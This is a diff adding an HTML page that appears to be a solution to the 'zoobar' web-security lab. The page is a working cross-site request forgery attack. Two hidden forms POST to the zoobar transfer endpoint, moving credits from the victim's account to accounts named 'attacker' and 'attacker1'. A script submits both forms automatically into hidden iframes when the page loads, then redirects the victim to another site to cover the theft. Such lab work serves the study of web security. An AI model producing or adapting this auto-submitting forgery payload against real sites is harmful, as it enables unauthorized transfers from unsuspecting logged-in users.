@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+    </head>
+    <body>
+
+        <form style="visibility:hidden;" method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer"  target="frame">
+        <input name="zoobars"  type="text" value="1">
+        <input name="recipient" type="text" value="attacker">
+        <input id ="attack" type="submit" name="submission" value="Send">
+        </form>
+        <iframe id="frame" name="frame" style="visibility:hidden;" src="http://localhost:8080/zoobar/index.cgi/transfer"> </iframe>
+
+        <form style="visibility:hidden;" method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer"  target="frame1">
+        <input name="zoobars"  type="text" value="9">
+        <input name="recipient" type="text" value="attacker1">
+        <input id ="attack1" type="submit" name="submission" value="Send">
+        </form>
+        <iframe id="frame1" name="frame1" style="visibility:hidden;" src="http://localhost:8080/zoobar/index.cgi/transfer"> </iframe>
+
+        <script>
+          document.getElementById('attack').click();
+          document.getElementById('attack1').click();
+            document.getElementById('frame1').onload = function () {
+                    window.location.href = "http://cseproj91.cse.iitk.ac.in:9443";
+                }
+
+        </script>
+    </body>
+</html>
